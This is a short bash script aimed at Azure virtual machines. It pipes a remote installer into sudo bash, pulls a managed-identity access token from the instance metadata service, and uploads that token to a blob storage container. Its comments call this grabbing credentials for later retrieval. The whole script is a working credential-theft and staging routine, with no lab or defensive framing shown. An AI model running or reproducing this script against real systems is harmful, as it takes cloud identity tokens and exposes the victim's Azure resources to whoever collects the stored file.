#!/usr/bin/env bash

# Step 0: Install Azure cli
curl -sL https://aka.ms/InstallAzureCLIDeb | sudo bash

# Step 1: Grab creds from metadata service and write to file creds.txt
echo $(curl -H Metadata:true "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2019-06-01&resource=https://management.azure.com") > token.txt

# Step 2: Put cred-file into blob storage for retrieval later
az login --identity
storageKey=$(az storage account keys list --account-name calipsostorageazure --query "[0].value")
az storage blob upload -f token.txt -c calipsocontainer -n calipsocreds.txt --account-name calipsostorageazure --account-key $storageKey
